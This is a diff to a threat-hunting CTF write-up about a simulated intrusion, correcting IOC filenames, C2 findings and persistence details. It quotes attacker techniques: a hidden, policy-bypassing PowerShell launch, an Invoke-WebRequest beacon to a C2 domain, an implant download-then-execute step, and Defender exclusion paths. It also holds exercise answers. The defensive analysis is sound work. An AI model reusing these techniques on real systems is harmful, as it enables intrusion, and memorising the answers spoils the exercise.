@@ -74,7 +74,7 @@ Executes: PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass 
 **IOCs:**
 - `PHTG HealthCloud.lnk`
 - `task_FLAG-05.ps1`
-- `PHGTHealthCloudSvc.exe`
+- `PHtGHealthCloudSvc.exe`
 - `C:\ProgramData\PHTG\HealthCloud\Cache\`
 
 ![P03 — Quiet Roots](assets/p03-quiet-roots.png)
@@ -113,7 +113,7 @@ Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&d
 
 ## P05 — Outbound Whispers (Where Traffic Went)
 
-**Finding:** Both beacons confirmed reaching Cloudflare-fronted IPs on port 443/TLS. DNS resolved via Azure internal resolver. Two subdomains split C2 functions — `updates` for tasking, `status` for check-in.
+**Finding:** Both beacons confirmed reaching Cloudflare-fronted IPs on port 443/TLS. DNS resolved via Azure internal resolver. Two subdomains split C2 functions — `updates` for tool delivery (ingress transfer), `status` for ongoing C2 check-in.
 
 **Key Query:**
 ```kql
@@ -159,13 +159,13 @@ DeviceRegistryEvents
 ```powershell
 HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths → C:\Users\vmAdminUsername\Documents\PHTG
 HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths → C:\ProgramData\PHTG\HealthCloud\Cache
-HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes → C:\ProgramData\PHTG\HealthCloud\PHGTHealthCloudSvc.exe
+HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes → C:\ProgramData\PHTG\HealthCloud\PHtGHealthCloudSvc.exe
 ```
 
 **IOCs:**
 - `amsi_probe.ps1`
 - `msmpeng.exe` (writing its own exclusions)
-- `PHGTHealthCloudSvc.exe`
+- `PHtGHealthCloudSvc.exe`
 
 ![P06 — Doors Held Open](assets/p06-doors-held-open.png)
 
@@ -173,7 +173,7 @@ HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes → C:\ProgramData
 
 ## P07 — Hands on the Vault (Final Actions)
 
-**Finding:** `phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly — operator targeting M365 authentication. At 15:55 operator went hands-on-keyboard launching notepad, calc, and mspaint interactively confirming live desktop access. Scheduled task persistence confirmed firing independently at 13:40 and 15:55 without active RDP session.
+**Finding:** `phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly — operator targeting M365 authentication. At 15:55 operator went hands-on-keyboard launching notepad, calc, and mspaint interactively confirming live desktop access. Startup LNK and Run key persistence confirmed firing independently at 13:40 without an active RDP session.
 
 **Key Query:**
 ```kql
@@ -190,7 +190,7 @@ DeviceProcessEvents
 | Time | Event |
 |---|---|
 | 10:40 | `msedge` → `login.microsoftonline.com` (M365 auth attempt) |
-| 13:40 | `phtg_activity.ps1` fires via scheduled task (persistence confirmed) |
+| 13:40 | `phtg_activity.ps1` fires via Startup LNK / Run key (persistence confirmed without active RDP) |
 | 15:55 | `notepad.exe`, `calc.exe`, `mspaint.exe` — hands-on-keyboard confirmed |
 | 17:00 | Activity still ongoing |
 
@@ -627,12 +627,6 @@ Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&d
 
 **Finding:** The pre-staged PS1 script (`task_FLAG-01.ps1`) makes an outbound HTTPS call to `updates.health-cloud.cc` — this is the download step. One second later it launches the retrieved binary — this is the execute step. The script already existed on disk; the connection was not to download the script but to fetch the implant binary itself.
 
-Answer:
-```
-Download then execute: a pre-staged PowerShell script makes an outbound HTTPS call to updates.health-cloud.cc to fetch PHtGHealthCloudSvc.exe (T1105 ingress tool transfer), then immediately launches the downloaded binary one second later — the PS1 script is the link between the two steps.
-
-```
-
 **Key Query:**
 ```kql
 DeviceProcessEvents
@@ -742,7 +736,7 @@ DeviceEvents
 ```
 
 **MITRE:** T1562.001 — Impair Defenses: Disable or Modify Tools  
-**Answer:** `ExclusionPath C:\ProgramData\PHTG\HealthCloud\Cache` and `ExclusionProcess C:\ProgramData\PHTG\HealthCloud\PHTGHealthCloudSvc.exe`
+**Answer:** `ExclusionPath C:\ProgramData\PHTG\HealthCloud\Cache` and `ExclusionProcess C:\ProgramData\PHTG\HealthCloud\PHtGHealthCloudSvc.exe`
 
 ![Q22 — Defender Tampering](assets/q22-defender-tampering.png)
 
